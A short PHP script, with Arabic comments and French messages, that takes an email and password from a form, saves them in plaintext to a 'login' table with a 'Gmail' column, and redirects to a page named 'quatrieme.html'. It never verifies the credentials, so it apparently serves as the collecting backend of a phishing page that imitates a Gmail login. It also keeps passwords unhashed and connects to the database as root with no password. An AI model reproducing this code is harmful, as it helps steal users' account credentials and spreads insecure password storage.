<?php
$servername = "localhost";
$username = "root";
$password = ""; // إذا كنت تستخدم XAMPP، اتركها فارغة
$dbname = "client";

// إنشاء الاتصال
$conn = new mysqli($servername, $username, $password, $dbname);

// التحقق من الاتصال
if ($conn->connect_error) {
    die("Échec de la connexion : " . $conn->connect_error);
}

// استلام البيانات من النموذج
$email = $_POST['email'];
$motdepasse = $_POST['password'];

// حماية ضد إدخال برمجي
$email = $conn->real_escape_string($email);
$motdepasse = $conn->real_escape_string($motdepasse);

// إدخال البيانات في قاعدة البيانات
$sql = "INSERT INTO login (Gmail, password) VALUES ('$email', '$motdepasse')";

if ($conn->query($sql) === TRUE) {
    // إعادة التوجيه عند النجاح
    header("Location: quatrieme.html");
    exit();
} else {
    echo "Erreur lors de l'enregistrement: " . $conn->error;
}

$conn->close();
?>
